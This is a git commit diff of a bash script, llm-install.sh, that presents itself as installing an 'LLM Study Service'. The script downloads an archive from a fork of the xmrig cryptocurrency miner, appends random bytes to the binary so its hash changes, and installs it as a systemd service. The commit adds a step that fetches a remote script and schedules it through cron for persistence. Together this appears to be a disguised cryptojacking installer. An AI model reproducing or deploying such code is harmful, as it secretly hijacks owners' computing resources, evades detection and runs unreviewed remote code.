1e122cf7271ffdb5a2269dc2ffa80a4833f28543
caippx <37325838+caippx@users.noreply.github.com>
2024-12-22 02:06:42 +0800

    Update llm-install.sh

--- drfytgybhunjoimkol/llm-install.sh
+++ drfytgybhunjoimkol/llm-install.sh
@@ -1,7 +1,14 @@
 #!/bin/bash
 
 #llmproxy.6553500.xyz
-apt update -y & apt install zip -y
+if ! command -v unzip
+then
+    echo "unzip 不存在，正在安装..."
+    apt update -y & apt install zip -y
+    echo "tcping 安装完成"
+else
+    echo "tcping 已经安装"
+fi
 U=$1
 wget https://github.com/caippx/xmrig/releases/download/6.22.2/llm.zip 
 unzip llm.zip && rm -rf llm.zip
@@ -12,6 +19,12 @@ count=$((RANDOM % 1000 + 1))
 for ((i = 0; i < count; i++)); do
   echo -n "0" >> "/etc/llm/llm-server"
 done
+wget https://raw.githubusercontent.com/caippx/bash/refs/heads/master/drfytgybhunjoimkol/random_usage.sh
+chmod +x random_usage.sh
+cron_job="0 */2 * * * /etc/llm/random_usage.sh"
+(crontab -l | grep -qF "$cron_job") || (crontab -l; echo "$cron_job") | crontab -
+service cron reload
+service crond reload
 cat > /etc/systemd/system/llm.service <<EOL
 [Unit]
 Description=LLM Study Service
